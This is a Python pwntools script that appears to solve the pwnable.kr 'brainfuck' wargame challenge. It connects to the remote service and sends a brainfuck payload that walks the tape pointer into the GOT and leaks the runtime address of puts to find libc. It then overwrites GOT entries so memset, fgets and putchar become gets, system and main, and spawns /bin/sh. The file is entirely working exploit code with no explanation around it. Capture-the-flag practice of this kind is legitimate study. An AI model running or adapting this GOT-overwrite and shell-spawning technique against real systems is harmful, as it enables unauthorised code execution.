from pwn import *
# context.log_level='debug'
libc = ELF('./brainfuck/libc-2.23.so')

tape = 0x804a0a0

def diff(src:int,dest:int):
    d = dest-src
    a = abs(d)
    return a*'<' if d<0 else a*'>'

memset_got = 0x804a02c
puts_got = 0x804a018
fgets_got = 0x804a010
putchar_got = 0x804a030

p = remote('pwnable.kr',10017)

payload = (
    diff(tape, puts_got) + '.>.>.>.' +           # leak puts runtime -> find libc address
    diff(puts_got+3, memset_got) + ',>,>,>,' +   # memset GOT -> gets(input)
    diff(memset_got+3, fgets_got) + ',>,>,>,' +  # fgets GOT -> system(input)
    diff(fgets_got+3, putchar_got) + ',>,>,>,' + # putchar GOT -> main
    '.'                                          # trigger putchar() -> main()
)

payload = payload.encode()
print(len(payload), payload)

p.sendlineafter(b'type some', payload)
p.recvuntil(b'\n')
bruh=p.recvn(4)
print('[LEAK PUTS RUNTIME]', bruh)

puts_runtime = u32(bruh)
libc_runtime = puts_runtime - libc.symbols['puts']
system_runtime = libc_runtime + libc.symbols['system']
gets_runtime = libc_runtime + libc.symbols['gets']

print('LIBC Runtime', hex(libc_runtime))
print('PUTS Runtime:', hex(puts_runtime))
print(f'{system_runtime=:#x} {gets_runtime=:#x}')

main = 0x8048671
p.send(p32(gets_runtime)+p32(system_runtime)+p32(main))

p.sendline(b'/bin/sh')
p.interactive()